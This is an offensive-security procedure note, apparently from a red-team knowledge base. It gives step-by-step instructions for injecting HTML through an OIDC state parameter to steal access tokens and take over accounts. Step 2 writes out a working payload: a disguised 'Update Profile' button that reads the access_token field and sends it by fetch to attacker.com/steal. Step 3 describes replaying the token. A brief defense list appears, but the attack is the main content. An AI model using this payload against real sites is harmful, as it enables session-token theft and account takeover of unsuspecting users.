---
id: proc-uuid-placeholder-002
tags:
  - xss
  - html-injection
  - token-theft
  - ato
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-13T23:55:38.095Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
---
# Inject-Malicious-HTML-for-Token-Theft

## Summary

This procedure exploits HTML injection in the OIDC state parameter to insert a malicious button or form that exfiltrates the access token to an attacker-controlled server upon user click, enabling account takeover.

## Description

Following validation of the injection flaw, craft a payload that injects an interactive HTML element (e.g., a button) into the authentication response. When the user interacts, it captures the access token from the form and sends it via POST or fetch to the attacker's site. This requires minimal user interaction and bypasses some CSP protections since it's HTML rather than full JavaScript XSS. The target is web applications using OIDC form_post, with outcomes including token theft and subsequent ATO. Prerequisites: Confirmed injection point and control over an external endpoint for receiving stolen data.

## Requirements

1. Attacker-controlled server (e.g., ngrok or VPS) to receive tokens
2. Proxy for payload injection during auth flow
3. Knowledge of form field names containing the access token

## Defense

Defensive measures and detection strategies:

- Sanitize and encode state parameter to prevent HTML injection
- Strengthen CSP to disallow unsafe-inline and eval
- Log and alert on access tokens sent to external domains

## Objectives

1. Inject HTML payload to create exfiltration mechanism
2. Steal access token with user interaction
3. Achieve account takeover using stolen token

## Instructions

### Step 1: Prepare Attacker Endpoint

**Context**: Set up a server to capture incoming token data.

Deploy a simple HTTP listener on attacker.com/steal (use ngrok for local testing).

### Step 2: Craft and Inject Payload

**Context**: Modify state parameter with malicious HTML targeting the token field.

Intercept the OIDC request and set state to: `<button onclick="var token = document.querySelector('input[name=access_token]').value; fetch('https://attacker.com/steal', {method: 'POST', body: token})">Update Profile</button>`.

> Forward the request and complete auth; the button appears in the response form.

### Step 3: Trigger Exfiltration

**Context**: Interact with injected element to send token.

Click the injected button in the browser.

> Expected output: POST request to attacker endpoint containing the access token value. Use the token for ATO by replaying in API calls.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Steal Web Session Cookie]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[token-theft]]
- [[ato]]
- [[html-injection]]
